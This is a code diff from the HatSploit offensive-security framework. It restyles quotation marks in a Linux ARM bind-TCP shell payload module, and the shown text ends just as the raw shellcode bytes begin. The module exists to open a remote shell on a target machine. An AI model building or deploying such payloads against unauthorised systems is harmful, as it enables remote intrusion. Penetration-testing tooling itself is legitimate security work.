@@ -9,18 +9,18 @@ from pex.socket import Socket
 
 class HatSploitPayload(Payload, Socket):
     details = {
-        'Name': "Linux armle Shell Bind TCP",
-        'Payload': "linux/armle/shell_bind_tcp",
-        'Authors': ['Ivan Nikolsky (enty8080) - payload developer'],
-        'Description': "Shell bind TCP payload for Linux armle.",
-        'Architecture': "armle",
-        'Platform': "linux",
-        'Rank': "high",
-        'Type': "bind_tcp",
+        "Name": "Linux armle Shell Bind TCP",
+        "Payload": "linux/armle/shell_bind_tcp",
+        "Authors": ["Ivan Nikolsky (enty8080) - payload developer"],
+        "Description": "Shell bind TCP payload for Linux armle.",
+        "Architecture": "armle",
+        "Platform": "linux",
+        "Rank": "high",
+        "Type": "bind_tcp",
     }
 
     def run(self):
-        bind_port = self.pack_port(self.handler['BPORT'])
+        bind_port = self.pack_port(self.handler["BPORT"])
 
         return (
             b"\x01\xe0\x8f\xe2"
